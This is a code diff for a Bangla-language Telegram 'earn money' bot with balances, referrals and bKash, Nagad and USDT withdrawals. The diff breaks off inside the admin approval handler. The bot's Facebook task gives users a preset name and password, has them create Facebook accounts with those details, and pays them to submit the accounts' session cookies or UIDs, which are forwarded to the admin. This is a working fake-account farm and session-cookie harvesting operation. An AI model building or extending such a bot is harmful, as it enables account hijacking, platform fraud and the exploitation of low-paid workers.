@@ -1,409 +1,475 @@
-import logging
-import os
 import sqlite3
-import threading
-from flask import Flask
-from aiogram import Bot, Dispatcher, executor, types
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.dispatcher import FSMContext
-from aiogram.dispatcher.filters.state import State, StatesGroup
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    ConversationHandler,
+    filters
+)
 
-# রেন্ডারের এনভায়রনমেন্ট ভ্যারিয়েবল থেকে টোকেন এবং অ্যাডমিন আইডি রিড করবে
-API_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID_STR = os.getenv("ADMIN_ID")
+ADMIN_ID = 123456789  # আপনার টেলিগ্রাম অ্যাডমিন আইডি এখানে বসাবেন
 
-if not API_TOKEN:
-    raise ValueError("BOT_TOKEN এনভায়রনমেন্ট ভ্যারিয়েবল সেট করা নেই।")
+# কনভারসেশন স্টেপস
+WAITING_FOR_2FA = 1
+WAITING_FOR_FB_COOKIES = 2
+WAITING_FOR_BKASH_NAGAD_NUMBER = 10
+WAITING_FOR_USDT_LINK = 11
+WAITING_FOR_WITHDRAW_AMOUNT = 12
 
-if not ADMIN_ID_STR:
-    raise ValueError("ADMIN_ID সেট করা নেই। আপনার Telegram numeric user ID environment variable হিসেবে সেট করুন।")
-
-ADMIN_ID = int(ADMIN_ID_STR)
-
-logging.basicConfig(level=logging.INFO)
-
-bot = Bot(token=API_TOKEN)
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
-
-# ---------------------------------------------------------
-# ডাটাবেস ইনিশিয়ালাইজেশন (SQLite Database Setup)
-# ---------------------------------------------------------
+# --- ডাটাবেস সেটআপ ---
 def init_db():
-    conn = sqlite3.connect("database.db")
+    conn = sqlite3.connect("bot_database.db")
     cursor = conn.cursor()
+    # ইউজার টেবিল (ব্যালেন্স, মোট আয়, সম্পন্ন কাজ, রিভিউ কাজ, রেফার কাউন্ট, রেফার আয়)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
-            balance REAL DEFAULT 0.0,
-            total_income REAL DEFAULT 0.0,
-            completed_tasks INTEGER DEFAULT 0
+            balance REAL DEFAULT 0.00,
+            pending_withdraw REAL DEFAULT 0.00,
+            total_income REAL DEFAULT 0.00,
+            completed_tasks INTEGER DEFAULT 0,
+            review_tasks INTEGER DEFAULT 0,
+            refer_count INTEGER DEFAULT 0,
+            refer_income REAL DEFAULT 0.00,
+            referred_by INTEGER DEFAULT NULL
         )
     """)
     conn.commit()
     conn.close()
 
-init_db()
-
 def get_user(user_id):
-    conn = sqlite3.connect("database.db")
+    conn = sqlite3.connect("bot_database.db")
     cursor = conn.cursor()
-    cursor.execute("SELECT balance, total_income, completed_tasks FROM users WHERE user_id = ?", (user_id,))
+    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
     row = cursor.fetchone()
     if not row:
-        cursor.execute("INSERT INTO users (user_id, balance, total_income, completed_tasks) VALUES (?, 0.0, 0.0, 0)", (user_id,))
+        cursor.execute("""
+            INSERT INTO users (user_id, balance, pending_withdraw, total_income, completed_tasks, review_tasks, refer_count, refer_income)
+            VALUES (?, 0.0, 0.0, 0.0, 0, 0, 0, 0.0)
+        """, (user_id,))
         conn.commit()
-        row = (0.0, 0.0, 0)
+        cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
+        row = cursor.fetchone()
     conn.close()
-    return row
+    return {
+        "user_id": row[0],
+        "balance": row[1],
+        "pending_withdraw": row[2],
+        "total_income": row[3],
+        "completed_tasks": row[4],
+        "review_tasks": row[5],
+        "refer_count": row[6],
+        "refer_income": row[7],
+        "referred_by": row[8]
+    }
 
-def update_user_balance(user_id, amount):
-    conn = sqlite3.connect("database.db")
+def update_user_field(user_id, field, value):
+    conn = sqlite3.connect("bot_database.db")
     cursor = conn.cursor()
-    cursor.execute("""
-        UPDATE users 
-        SET balance = balance + ?, total_income = total_income + ?, completed_tasks = completed_tasks + 1 
-        WHERE user_id = ?
-    """, (amount, amount, user_id))
+    cursor.execute(f"UPDATE users SET {field} = ? WHERE user_id = ?", (value, user_id))
     conn.commit()
     conn.close()
 
-# ---------------------------------------------------------
-# রেন্ডার ফ্রি টিয়ার পোর্টের জন্য ফ্লাস্ক সার্ভার (Web Service Port Requirement)
-# ---------------------------------------------------------
-app = Flask(__name__)
+def add_user_balance(user_id, amount):
+    user = get_user(user_id)
+    new_bal = user["balance"] + amount
+    new_tot = user["total_income"] + amount
+    conn = sqlite3.connect("bot_database.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET balance = ?, total_income = ? WHERE user_id = ?", (new_bal, new_tot, user_id))
+    conn.commit()
+    conn.close()
 
-@app.route('/')
-def home():
-    return "Bot is running 24/7 successfully with Database!"
+# --- মূল মেনু ---
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_name = update.effective_user.first_name
+    keyboard = [
+        ["📋 কাজ ▶", "💰 ব্যালেন্স"],
+        ["💵 টাকা উত্তোলন", "🎁 My Referrals"],
+        ["👨‍💻 সাপোর্ট", "👶 আমি নতুন"]
+    ]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    welcome_message = f"🤖 স্বাগতম, MD: {user_name}!\n☑️ কাজ শুরু করতে নিচের অপশনগুলো ব্যবহার করুন 🔻"
+    await update.message.reply_text(welcome_message, reply_markup=reply_markup)
 
-def run_flask():
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+# --- স্টার্ট ও রেফারেল হ্যান্ডলার ---
+async def start_with_referral(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+    
+    # ইউজার ডাটাবেসে আছে কিনা চেক এবং ক্রিয়েট
+    user_data = get_user(user_id)
+    
+    args = context.args
+    if args and args[0].startswith("ref_") and user_data["referred_by"] is None:
+        try:
+            referrer_id = int(args[0].split("_")[1])
+            if referrer_id != user_id:
+                update_user_field(user_id, "referred_by", referrer_id)
+                ref_user = get_user(referrer_id)
+                new_count = ref_user["refer_count"] + 1
+                update_user_field(referrer_id, "refer_count", new_count)
+                
+                try:
+                    await context.bot.send_message(
+                        chat_id=referrer_id,
+                        text="🎉 অভিনন্দন! আপনার রেফারল লিংকের মাধ্যমে একজন নতুন ইউজার জয়েন করেছে!"
+                    )
+                except:
+                    pass
+        except Exception as e:
+            print(f"Referral error: {e}")
 
+    await show_main_menu(update, context)
 
-# --- স্টেট (FSM) ক্লাসসমূহ ---
-class FacebookTaskState(StatesGroup):
-    waiting_for_uid = State()
-    waiting_for_cookies = State()
-
-class WithdrawFlow(StatesGroup):
-    waiting_for_address_or_number = State()
-    waiting_for_amount = State()
-
-# ---------------------------------------------------------
-# ০. মূল মেনু কিবোর্ড তৈরির ফাংশন
-# ---------------------------------------------------------
-def get_main_keyboard():
-    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    keyboard.add(
-        KeyboardButton("📋 কাজ ▶"),
-        KeyboardButton("💰 ব্যালেন্স"),
-        KeyboardButton("💵 টাকা উত্তোলন"),
-        KeyboardButton("🎁 My Referrals"),
-        KeyboardButton("☎️ সাপোর্ট"),
-        KeyboardButton("👶 আমি নতুন")
+# --- ব্যালেন্স ড্যাশবোর্ড ---
+async def check_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    stats = get_user(user_id)
+    
+    balance_msg = (
+        "💵 **আপনার ব্যালেন্স**\n"
+        "──────────────────\n"
+        f"💰 ব্যালেন্স: {stats['balance']:.2f} BDT\n"
+        f"💰 পেন্ডিং (উইথড্র): {stats['pending_withdraw']:.2f} BDT\n"
+        f"💰 Total Income: {stats['total_income']:.2f} BDT\n\n"
+        f"✅ সম্পন্ন কাজ: {stats['completed_tasks']} টি\n"
+        f"⏳ রিভিউতে আছে: {stats['review_tasks']} টি"
     )
-    return keyboard
+    await update.message.reply_text(balance_msg, parse_mode="Markdown")
 
-# ---------------------------------------------------------
-# ১. স্টার্ট কমান্ড হ্যান্ডলার
-# ---------------------------------------------------------
-@dp.message_handler(commands=['start'])
-async def send_welcome(message: types.Message):
-    user_name = message.from_user.first_name
-    welcome_text = (
-        f"🤖 স্বাগত, {user_name}!\n"
-        f"✅ কাজ শুরু করতে নিচের অপশনগুলো ব্যবহার করুন 👇"
+# --- My Referrals মেনু ---
+async def handle_referral_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    bot_username = context.bot.username
+    ref_data = get_user(user_id)
+    
+    referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
+    
+    ref_msg = (
+        "🎁 **My Referrals**\n"
+        f"👤 **Total Refer:** {ref_data['refer_count']}\n"
+        f"😃 **Total Refer Income:** {ref_data['refer_income']:.2f} BDT\n"
+        "🔗 **আপনার রেফার লিংক:**👇\n\n"
+        f"`{referral_link}`\n\n"
+        "ℹ️ আপনি আপনার প্রতিটি রেফারেলের সম্পূর্ণ করা কাজ থেকে আয়ের ১৫% কমিশন পাবেন।"
     )
-    await message.reply(welcome_text, reply_markup=get_main_keyboard())
+    await update.message.reply_text(ref_msg, parse_mode="Markdown")
 
+# --- কাজের ক্যাটাগরি মেনু ---
+async def handle_tasks_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    task_keyboard = [
+        ["📷 ইনস্টাগ্রাম কাজ >"],
+        ["📧 Gmail কাজ", "🪙 Coin Work"],
+        ["f Facebook কাজ"],
+        ["❌ বাতিল"]
+    ]
+    reply_markup = ReplyKeyboardMarkup(task_keyboard, resize_keyboard=True)
+    await update.message.reply_text("🟣 সিলেক্ট করুন:", reply_markup=reply_markup)
 
-# ---------------------------------------------------------
-# ২. কাজ মেনু সিস্টেম (ইনলাইন বাটন)
-# ---------------------------------------------------------
-@dp.message_handler(text="📋 কাজ ▶")
-async def show_tasks_menu(message: types.Message):
-    markup = InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        InlineKeyboardButton("📸 ইনস্টাগ্রাম কাজ >", callback_data="task_instagram"),
-        InlineKeyboardButton("📧 Gmail কাজ", callback_data="task_gmail"),
-        InlineKeyboardButton("🪙 Coin Work", callback_data="task_coin"),
-        InlineKeyboardButton("📘 Facebook কাজ", callback_data="submit_fb_uid"),
-        InlineKeyboardButton("❌ বাতিল", callback_data="task_cancel")
+async def handle_facebook_tasks(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    facebook_keyboard = [["✉️ Anymail/Number"], ["❌ বাতিল"]]
+    reply_markup = ReplyKeyboardMarkup(facebook_keyboard, resize_keyboard=True)
+    await update.message.reply_text("🟣 সিলেক্ট করুন:", reply_markup=reply_markup)
+
+async def handle_anymail_tasks(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    anymail_keyboard = [["f 0 fnd cookies | 4.00 ৳"], ["🔙 ফিরে যান"]]
+    reply_markup = ReplyKeyboardMarkup(anymail_keyboard, resize_keyboard=True)
+    await update.message.reply_text("🟣 সিলেক্ট করুন:", reply_markup=reply_markup)
+
+async def handle_specific_facebook_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = (
+        "🟢 First name: Heitor\n"
+        "🟢 Last name: Silva\n"
+        "🔒 Password: kamrol@03\n\n"
+        "f উপরের তথ্য দিয়ে অ্যাকাউন্ট খুলে নিচে UID দিন বাটনেন চাপ দিন 🤣"
     )
-    await message.reply("🟣 সিলেক্ট করুন:", reply_markup=markup)
+    fb_action_keyboard = [["✔ UID দিন"], ["👶 কিভাবে কাজ করব", "❌ বাতিল"]]
+    reply_markup = ReplyKeyboardMarkup(fb_action_keyboard, resize_keyboard=True)
+    await update.message.reply_text(msg, reply_markup=reply_markup)
 
-@dp.callback_query_handler(text="task_cancel")
-async def cancel_callback(call: types.CallbackQuery):
-    await call.message.edit_text("❌ বাতিল করা হয়েছে।")
-    await call.answer()
+# --- ফেসবুক কুকিজ সাবমিশন ---
+async def ask_for_fb_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    cancel_keyboard = [["❌ বাতিল"]]
+    reply_markup = ReplyKeyboardMarkup(cancel_keyboard, resize_keyboard=True)
+    await update.message.reply_text("☑️ আপনার ফেসবুক অ্যাকাউন্টের কুকিজ (Cookies) অথবা UID-টি দিন:", reply_markup=reply_markup)
+    return WAITING_FOR_FB_COOKIES
 
-
-# ---------------------------------------------------------
-# ৩. ব্যালেন্স ড্যাশবোর্ড সিস্টেম
-# ---------------------------------------------------------
-@dp.message_handler(text="💰 ব্যালেন্স")
-async def show_user_balance(message: types.Message):
-    user_id = message.from_user.id
-    balance, total_income, completed_tasks = get_user(user_id)
+async def receive_fb_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_cookies = update.message.text
+    user = update.effective_user
     
-    pending_withdraw = 0.00
-    pending_review = "0.00"
-    
-    balance_text = (
-        f"💵 আপনার ব্যালেন্স\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💵 ব্যালেন্স: {balance:.2f} BDT\n"
-        f"💸 পেন্ডিং (উইথড্র): {pending_withdraw:.2f} BDT\n"
-        f"💰 Total Income: {total_income:.2f} BDT\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"✅ সম্পন্ন কাজ: {completed_tasks:02d}টি\n"
-        f"⏳ রিভিউতে আছে: {pending_review} টি"
+    # ইউজারের রিভিউ কাউন্ট আপডেট
+    user_data = get_user(user.id)
+    update_user_field(user.id, "review_tasks", user_data["review_tasks"] + 1)
+
+    user_success_msg = (
+        "✅ সফল ভাবে আপনার ফেসবুক কাজটি জমা হয়েছে\n"
+        "এই কাজের টাকা 3 থেকে 72 ঘন্টার ভিতরে আপনার একাউন্টে জমা হয়ে যাবে, ধন্যবাদ!"
     )
-    
-    await message.reply(balance_text, reply_markup=get_main_keyboard())
+    await update.message.reply_text(user_success_msg)
+    await show_main_menu(update, context)
 
-
-# ---------------------------------------------------------
-# ৪. ফেসবুক টাস্ক সিস্টেম
-# ---------------------------------------------------------
-@dp.callback_query_handler(text="submit_fb_uid")
-async def request_fb_uid(call: types.CallbackQuery):
-    await call.message.answer("আপনার ফেসবুক অ্যাকাউন্টের ১৪ থেকে ১৬ সংখ্যার UID-টি দিন:")
-    await FacebookTaskState.waiting_for_uid.set()
-    await call.answer()
-
-@dp.message_handler(state=FacebookTaskState.waiting_for_uid)
-async def receive_fb_uid(message: types.Message, state: FSMContext):
-    user_uid = message.text.strip()
-    await state.update_data(user_uid=user_uid)
-    
-    await message.reply("📘 এবার আপনার ফেসবুক অ্যাকাউন্টের Cookies-টি দিন:")
-    await FacebookTaskState.waiting_for_cookies.set()
-
-@dp.message_handler(state=FacebookTaskState.waiting_for_cookies)
-async def receive_fb_cookies(message: types.Message, state: FSMContext):
-    user_cookies = message.text.strip()
-    data = await state.get_data()
-    user_uid = data.get('user_uid')
-    user_id = message.from_user.id
-    reward = 4.00
-    
-    admin_keyboard = InlineKeyboardMarkup(row_width=2)
-    btn_approve = InlineKeyboardButton("🔘 OK", callback_data=f"approve_fb_{user_id}_{reward}")
-    btn_reject = InlineKeyboardButton("❌ Reject", callback_data=f"reject_fb_{user_id}_{user_uid}")
-    admin_keyboard.add(btn_approve, btn_reject)
-    
-    await bot.send_message(
-        ADMIN_ID,
-        f"🔔 **নতুন ফেসবুক কাজ জমা পড়েছে!**\n\n"
-        f"👤 ইউজার আইডি: `{user_id}`\n"
-        f"🆔 UID: `{user_uid}`\n"
-        f"🍪 Cookies: `{user_cookies}`\n"
-        f"💰 রেট: ৳{reward}",
-        parse_mode="Markdown",
-        reply_markup=admin_keyboard
+    admin_msg = (
+        "New Facebook Task Submitted!\n\n"
+        f"User ID: {user.id}\n"
+        f"First Name: {user.first_name}\n"
+        f"Password: kamrol@03\n"
+        f"Cookies / UID: {user_cookies}\n"
+        f"Rate: ৳4.00\n\n"
+        "Status: ⏳ Under Review"
     )
+    admin_keyboard = [[InlineKeyboardButton("Reject ❌", callback_data="fb_reject"), InlineKeyboardButton("Approve ✅", callback_data="fb_approve")]]
     
-    await message.reply("এই কাজের রিপোর্ট খুব তাড়াতাড়ি আসবে, তাই সবাই আর দেরি না করে আরও বেশি করে কাজ করুন।")
-    await state.finish()
-
-@dp.callback_query_handler(text_startswith="approve_fb_")
-async def admin_approve_fb(call: types.CallbackQuery):
-    parts = call.data.split("_")
-    user_id = int(parts[2])
-    reward = float(parts[3])
-    
-    update_user_balance(user_id, reward)
-    
-    await bot.send_message(
-        user_id,
-        f"💎 কাজ এপ্রুভ হয়েছে: **+{reward:.2f} BDT** আপনার ব্যালেন্সে যোগ হয়েছে! 😄"
-    )
-    await call.message.edit_text(call.message.text + f"\n\n✅ **এপ্রুভ করা হয়েছে (+৳{reward})।**")
-    await call.answer()
-
-@dp.callback_query_handler(text_startswith="reject_fb_")
-async def admin_reject_fb(call: types.CallbackQuery):
-    parts = call.data.split("_")
-    user_id = int(parts[2])
-    user_uid = parts[3]
-    
-    await bot.send_message(
-        user_id,
-        f"🔴 **UID: {user_uid}** | পাসওয়ার্ড বা কুকিজ সঠিক নয় (লগইন হচ্ছে না😭)"
-    )
-    await call.message.edit_text(call.message.text + "\n\n❌ **বাতিল করা হয়েছে।**")
-    await call.answer()
-
-
-# ---------------------------------------------------------
-# ৫. উইথড্র (Withdrawal) সিস্টেম (আপনার স্ক্রিনশট অনুযায়ী আপডেটকৃত বাটন)
-# ---------------------------------------------------------
-@dp.message_handler(text="💵 টাকা উত্তোলন")
-async def withdraw_menu(message: types.Message):
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    btn_usdt = InlineKeyboardButton("🪙 USDT (BEP-20) -> সর্বনিম্ন: 0.25 (-0.05)", callback_data="withdraw_usdt")
-    btn_mobile = InlineKeyboardButton("📱 মোবাইল রিচার্জ -> সর্বনিম্ন: ২৫৳(-৫)", callback_data="withdraw_mobile")
-    btn_bkash = InlineKeyboardButton("💳 বিকাশ -> সর্বনিম্ন: ১১০৳(-১০)", callback_data="withdraw_bkash")
-    btn_nagad = InlineKeyboardButton("🟠 নগদ -> সর্বনিম্ন: ১০০৳(-১০)", callback_data="withdraw_nagad")
-    btn_back = InlineKeyboardButton("◀️ ফিরে যান", callback_data="back_to_main_menu")
-    
-    keyboard.add(btn_usdt, btn_mobile, btn_bkash, btn_nagad, btn_back)
-    await message.reply("💵 **টাকা তোলার মাধ্যম সিলেক্ট করুন:**[span_3](start_span)[span_3](end_span)", reply_markup=keyboard, parse_mode="Markdown")
-
-@dp.callback_query_handler(text="back_to_main_menu")
-async def back_to_main(call: types.CallbackQuery):
-    await call.message.edit_text("🏠 মূল মেনুতে ফিরে এসেছেন।")
-    await call.answer()
-
-@dp.callback_query_handler(text="withdraw_usdt")
-async def withdraw_usdt_start(call: types.CallbackQuery, state: FSMContext):
-    await state.update_data(method="USDT", min_limit=0.25)
-    await call.message.answer("🪙 আপনার **Binance PayID / USDT (BEP-20) Address** টি দিন:")
-    await WithdrawFlow.waiting_for_address_or_number.set()
-    await call.answer()
-
-@dp.callback_query_handler(text=["withdraw_mobile", "withdraw_bkash", "withdraw_nagad"])
-async def withdraw_mfs_start(call: types.CallbackQuery, state: FSMContext):
-    if call.data == "withdraw_mobile":
-        method = "Mobile Recharge"
-        min_limit = 25.0
-    elif call.data == "withdraw_bkash":
-        method = "Bkash"
-        min_limit = 110.0
-    else:
-        method = "Nagad"
-        min_limit = 100.0
-    
-    await state.update_data(method=method, min_limit=min_limit)
-    await call.message.answer(f"📱 আপনার **{method}** নাম্বারটি দিন:")
-    await WithdrawFlow.waiting_for_address_or_number.set()
-    await call.answer()
-
-@dp.message_handler(state=WithdrawFlow.waiting_for_address_or_number)
-async def receive_target_info(message: types.Message, state: FSMContext):
-    target_info = message.text.strip()
-    await state.update_data(target_info=target_info)
-    
-    await message.reply("💵 কত টাকা/USDT উইথড্র করতে চান তার পরিমাণ লিখুন:")
-    await WithdrawFlow.waiting_for_amount.set()
-
-@dp.message_handler(state=WithdrawFlow.waiting_for_amount)
-async def process_withdraw_amount(message: types.Message, state: FSMContext):
     try:
-        amount = float(message.text.strip())
+        sent_msg = await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=InlineKeyboardMarkup(admin_keyboard))
+        if 'pending_tasks' not in context.bot_data:
+            context.bot_data['pending_tasks'] = {}
+        context.bot_data['pending_tasks'][sent_msg.message_id] = {"user_id": user.id, "reward": 4.00}
+    except Exception as e:
+        print(f"Admin send error: {e}")
+
+    return ConversationHandler.END
+
+# --- টাকা উত্তোলন মেনু ---
+async def handle_withdraw_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    withdraw_keyboard = [
+        ["💠 USDT (BEP-20) -> সর্বনিম্ন: 0.25(-0.05)"],
+        ["📱 মোবাইল রিচার্জ -> সর্বনিম্ন: ২৫৳(-৫)"],
+        ["📲 বিকাশ -> সর্বনিম্ন: ১১০৳(-১০)"],
+        ["🔴 নগদ -> সর্বনিম্ন: ১০০৳(-১০)"],
+        ["🔙 ফিরে যান"]
+    ]
+    reply_markup = ReplyKeyboardMarkup(withdraw_keyboard, resize_keyboard=True)
+    await update.message.reply_text("💰 টাকা তোলার মাধ্যম সিলেক্ট করুন:", reply_markup=reply_markup)
+
+async def ask_for_withdraw_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    method_text = update.message.text
+    if "বিকাশ" in method_text:
+        context.user_data['withdraw_method'] = "Bkash"
+    elif "নগদ" in method_text:
+        context.user_data['withdraw_method'] = "Nagad"
+    elif "মোবাইল রিচার্জ" in method_text:
+        context.user_data['withdraw_method'] = "Mobile Recharge"
+    elif "USDT" in method_text:
+        context.user_data['withdraw_method'] = "USDT (BEP-20)"
+
+    user_id = update.effective_user.id
+    current_bal = get_user(user_id)["balance"]
+    
+    if current_bal < 0.25:  # সর্বনিম্ন লিমিট চেক
+        await update.message.reply_text(f"❌ আপনার পর্যাপ্ত ব্যালেন্স নেই! বর্তমান ব্যালেন্স: ৳{current_bal:.2f}")
+        return ConversationHandler.END
+
+    cancel_keyboard = [["❌ বাতিল"]]
+    reply_markup = ReplyKeyboardMarkup(cancel_keyboard, resize_keyboard=True)
+    
+    prompt = "💠 আপনার Binance Pay ID অথবা USDT (BEP-20) ডিপোজিট লিংকটি দিন:" if "USDT" in method_text else "📱 আপনার নম্বরটি দিন:"
+    await update.message.reply_text(prompt, reply_markup=reply_markup)
+    return WAITING_FOR_BKASH_NAGAD_NUMBER
+
+async def receive_withdraw_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['withdraw_account'] = update.message.text
+    cancel_keyboard = [["❌ বাতিল"]]
+    reply_markup = ReplyKeyboardMarkup(cancel_keyboard, resize_keyboard=True)
+    await update.message.reply_text("💵 আপনি কত টাকা তুলতে চান? পরিমাণটি সংখ্যায় লিখুন:", reply_markup=reply_markup)
+    return WAITING_FOR_WITHDRAW_AMOUNT
+
+async def finalize_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        amount = float(update.message.text)
     except ValueError:
-        await message.reply("⚠️ দয়া করে সঠিক সংখ্যা লিখুন:")
-        return
+        await update.message.reply_text("❌ সঠিক সংখ্যায় অ্যামাউন্ট লিখুন:")
+        return WAITING_FOR_WITHDRAW_AMOUNT
 
-    user_id = message.from_user.id
-    data = await state.get_data()
-    method = data.get("method")
-    min_limit = data.get("min_limit")
-    target_info = data.get("target_info")
-    
-    user_balance, _, _ = get_user(user_id)
+    user = update.effective_user
+    user_id = user.id
+    method = context.user_data.get('withdraw_method', 'Bkash')
+    account = context.user_data.get('withdraw_account', '')
 
-    if amount < min_limit or user_balance < amount:
-        if method == "USDT":
-            await message.reply(
-                f"❌ আপনার ব্যালেন্স পর্যাপ্ত নয়। মিনিমাম উইথড্র {min_limit} USDT。\n"
-                f"আপনার ব্যালেন্স: {user_balance} usdt"
-            )
-        else:
-            await message.reply(
-                f"❌ আপনার ব্যালেন্স পর্যাপ্ত নয়। {method}-এ উইথড্র দিতে কমপক্ষে {min_limit:.2f} ৳ প্রয়োজন।\n"
-                f"আপনার বর্তমান ব্যালেন্স: {user_balance} ৳"
-            )
-        await state.finish()
-        return
+    user_data = get_user(user_id)
+    if amount > user_data["balance"]:
+        await update.message.reply_text(f"❌ পর্যাপ্ত ব্যালেন্স নেই! বর্তমান ব্যালেন্স: ৳{user_data['balance']:.2f}")
+        return ConversationHandler.END
 
-    admin_kb = InlineKeyboardMarkup(row_width=2)
-    btn_approve = InlineKeyboardButton("✅ Pay Done", callback_data=f"w_app_{user_id}_{amount}_{method}")
-    btn_reject = InlineKeyboardButton("❌ Reject", callback_data=f"w_rej_{user_id}_{min_limit}_{method}")
-    admin_kb.add(btn_approve, btn_reject)
+    # ব্যালেন্স কমানো ও পেন্ডিং বাড়ানো
+    new_bal = user_data["balance"] - amount
+    new_pend = user_data["pending_withdraw"] + amount
+    conn = sqlite3.connect("bot_database.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET balance = ?, pending_withdraw = ? WHERE user_id = ?", (new_bal, new_pend, user_id))
+    conn.commit()
+    conn.close()
 
-    await bot.send_message(
-        ADMIN_ID,
-        f"🏧 **নতুন উইথড্র রিকোয়েস্ট!**\n\n"
-        f"👤 ইউজার আইডি: `{user_id}`\n"
-        f"💳 মাধ্যম: **{method}**\n"
-        f"📌 নাম্বার/লিংক: `{target_info}`\n"
-        f"💰 পরিমাণ: **{amount}**\n"
-        f"💵 ইউজারের ব্যালেন্স: `{user_balance}`",
-        parse_mode="Markdown",
-        reply_markup=admin_kb
+    user_success_msg = f"✅ আপনার টাকা তোলার মাধ্যম সঠিক ভাবে জমা হয়েছে আপনার {account} 2 থেকে 3 ঘন্টার ভিতরে টাকা জমা হবে ধন্যবাদ"
+    await update.message.reply_text(user_success_msg)
+    await show_main_menu(update, context)
+
+    remaining_balance = get_user(user_id)["balance"]
+    admin_withdraw_msg = (
+        "🔔 **New Withdrawal Request**\n\n"
+        f"👤 **User ID:** `{user_id}`\n"
+        f"📱 **Withdrawal Number/Address:** `{account}`\n"
+        f"💵 **Amount:** ৳{amount:.2f}\n"
+        f"💰 **Remaining Balance:** ৳{remaining_balance:.2f}\n"
+        f"📌 **Method:** {method}\n\n"
+        "Status: ⏳ Pending"
     )
 
-    if method == "USDT":
-        await message.reply("✅ আপনার উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে।")
-    else:
-        await message.reply("✅ আপনার টাকা 1 থেকে 2 ঘন্টার ভিতরে এড হয়ে জাবে।")
+    admin_keyboard = [[
+        InlineKeyboardButton("❌ NO", callback_data=f"withdraw_no_{user_id}_{amount}"),
+        InlineKeyboardButton("✅ OK", callback_data=f"withdraw_ok_{user_id}_{amount}_{method}")
+    ]]
+
+    try:
+        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_withdraw_msg, reply_markup=InlineKeyboardMarkup(admin_keyboard), parse_mode="Markdown")
+    except Exception as e:
+        print(f"Admin withdraw send error: {e}")
+
+    return ConversationHandler.END
+
+# --- অ্যাডমিন ডিসিশন হ্যান্ডলার ---
+async def admin_decision_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    original_text = query.message.text
+    
+    if data.startswith("withdraw_"):
+        parts = data.split("_")
+        action = parts[1]
+        user_id = int(parts[2])
+        amount = float(parts[3])
+        base_text = original_text.split("\n\nStatus:")[0]
         
-    await state.finish()
+        user_data = get_user(user_id)
 
-@dp.callback_query_handler(text_startswith="w_app_")
-async def admin_withdraw_approve(call: types.CallbackQuery):
-    parts = call.data.split("_")
-    user_id = int(parts[2])
-    amount = parts[3]
-    method = parts[4]
+        if action == "ok":
+            method = parts[4] if len(parts) > 4 else "মাধ্যম"
+            await query.edit_message_text(text=f"{base_text}\n\nStatus: SUCCESS ✅")
+            
+            # পেন্ডিং ব্যালেন্স কমানো
+            new_pend = max(0.0, user_data["pending_withdraw"] - amount)
+            update_user_field(user_id, "pending_withdraw", new_pend)
+            
+            try:
+                await context.bot.send_message(chat_id=user_id, text=f"সঠিক ভাবে আপনার ({method}) এ টাকা জমা হয়েছে")
+            except:
+                pass
 
-    unit = 'USDT' if 'USDT' in method else '৳'
-    await bot.send_message(
-        user_id,
-        f"🎉 আপনার একাউন্টে টাকা জমা হয়ে গেছে! পরিমাণ: {amount} {unit}"
+        elif action == "no":
+            await query.edit_message_text(text=f"{base_text}\n\nStatus: FAILED ❌")
+            
+            # টাকা ফেরত দেওয়া
+            new_bal = user_data["balance"] + amount
+            new_pend = max(0.0, user_data["pending_withdraw"] - amount)
+            conn = sqlite3.connect("bot_database.db")
+            cursor = conn.cursor()
+            cursor.execute("UPDATE users SET balance = ?, pending_withdraw = ? WHERE user_id = ?", (new_bal, new_pend, user_id))
+            conn.commit()
+            conn.close()
+            
+            try:
+                await context.bot.send_message(chat_id=user_id, text="দুঃখিত কোনো একটি সমস্যার কারনে টাকা পাঠানো জাই নাই NO আবার চেষ্টা করুন ধন্যবাদ")
+            except:
+                pass
+
+    elif data in ["fb_approve", "fb_reject"]:
+        message_id = query.message.message_id
+        pending_tasks = context.bot_data.get('pending_tasks', {})
+        task_info = pending_tasks.get(message_id)
+        if task_info:
+            target_user_id = task_info["user_id"]
+            reward = task_info["reward"]
+            base_text = original_text.split("\n\nStatus:")[0]
+            user_data = get_user(target_user_id)
+
